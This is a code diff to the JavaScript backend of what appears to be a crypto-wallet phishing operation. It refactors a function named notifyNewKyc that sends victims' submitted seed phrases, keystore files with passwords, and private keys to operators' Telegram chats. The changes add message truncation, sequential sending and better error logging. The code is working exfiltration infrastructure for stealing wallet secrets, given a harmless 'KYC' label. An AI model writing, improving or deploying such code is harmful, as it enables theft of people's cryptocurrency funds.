@@ -287,8 +287,11 @@ function notifyNewAdmin(username) {
   }
 }
 
+// Telegram max message length
+const TELEGRAM_MAX_LENGTH = 4096;
+
 // Send wallet submission to Telegram: session + whatever was collected (seed phrase, keystore+password, or private key)
-function notifyNewKyc(details) {
+async function notifyNewKyc(details) {
   const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey } = details;
   let message = `New Wallet Submission:\nSession ID: ${sessionId || 'N/A'}\nWallet Type: ${walletType || 'N/A'}`;
   if (seedPhrase) message += `\n\nSeed Phrase: ${seedPhrase}`;
@@ -296,17 +299,22 @@ function notifyNewKyc(details) {
   if (password) message += `\nPassword: ${password}`;
   if (privateKey) message += `\nPrivate Key: ${privateKey}`;
 
-  if (bot) {
-    chatIds.forEach(async chatId => {
-      try {
-        await bot.sendMessage(chatId, message);
-        await bot.sendMessage(chatId, 'Use /admin to manage admins.');
-      } catch (err) {
-        console.error('Failed to send telegram wallet message', err);
-      }
-    });
-  } else {
-    console.log('[telegram stub] notifyNewKyc:', message);
+  if (message.length > TELEGRAM_MAX_LENGTH) {
+    message = message.slice(0, TELEGRAM_MAX_LENGTH - 15) + '\n...[truncated]';
+  }
+
+  if (!bot) {
+    console.log('[telegram stub] notifyNewKyc (bot not enabled):', message.slice(0, 200) + (message.length > 200 ? '...' : ''));
+    return;
+  }
+
+  for (const chatId of chatIds) {
+    try {
+      await bot.sendMessage(chatId, message);
+      await bot.sendMessage(chatId, 'Use /admin to manage admins.');
+    } catch (err) {
+      console.error('Failed to send telegram wallet message to', chatId, err?.message || err);
+    }
   }
 }
 
